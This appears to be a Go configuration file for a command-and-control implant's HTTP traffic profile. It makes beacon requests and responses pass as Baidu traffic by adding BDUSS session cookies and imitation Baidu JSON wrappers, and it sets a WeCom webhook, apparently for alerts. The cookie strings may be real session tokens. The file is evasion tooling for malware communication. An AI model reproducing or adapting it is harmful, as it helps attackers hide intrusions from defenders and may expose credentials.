package config

var (
	Http_get_metadata_prepend = "BDUSS=mVwMHZ3dWNSajdVVXZtdi0yb3J4ZTJrb0NCcU1ObzRac1p6TFc1NUlwUnVpRlJtRVFBQUFBJCQAAAAAAAAAAAEAAAD94hH41~PB-sSkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG77LGZu-yxmS; BDUSS_BFESS=mVwMHZ3dWNSajdVVXZtdi0yb3J4ZTJrb0NCcU1ObzRac1p6TFc1NUlwUnVpRlJtRVFBQUFBJCQAAAAAAAAAAAEAAAD94hH41~PB-sSkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG77LGZu-yxmS;SESSIONID=" // 每个http get 请求发送的数据前添加的字符串
	Http_get_output_prepend   = "{\"data\":{\"log_id\":\"3796460674\",\"action_rule\":{\"pos_1\":[\""                                                                                                                                                                                                                                                                                                                                                             //  每个GET请求返回的数据在头部添加的字符串
	Http_get_output_append    = "%%\"],\"pos_2\":[],\"pos_3\":[]}}}"

	Http_post_id_prepend               = "BDUSS=mVwMHZ3dWNSajdVVXZtdi0yb3J4ZTJrb0NCcU1ObzRac1p6TFc1NUlwUnVpRlJtRVFBQUFBJCQAAAAAAAAAAAEAAAD94hH41~PB-sSkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG77LGZu-yxmS;user="
	Http_post_id_append                = "%%; BDUSS_BFESS=mVwMHZ3dWNSajdVVXZtdi0yb3J4ZTJrb0NCcU1ObzRac1p6TFc1NUlwUnVpRlJtRVFBQUFBJCQAAAAAAAAAAAEAAAD94hH41~PB-sSkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG77LGZu-yxmS"
	Http_post_client_output_prepend    = "{\"data\":{\"log_id\":\"3796460677\",\"action_rule\":{\"pos_1\":[],\"pos_2\":[\""
	Http_post_client_output_append     = "%%\"],\"pos_3\":[]}}}"
	Http_post_client_output_type       = "print"
	Http_post_client_output_type_value = "_data"
	Http_post_server_output_prepend    = "{\"data\":{\"log_id\":\"3796460679\",\"action_rule\":{\"pos_1\":[],\"pos_2\":[],\"pos_3\":[\""
	Http_post_server_output_append     = "%%\"]}}}"
	WecomPushApi                       = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send"
)
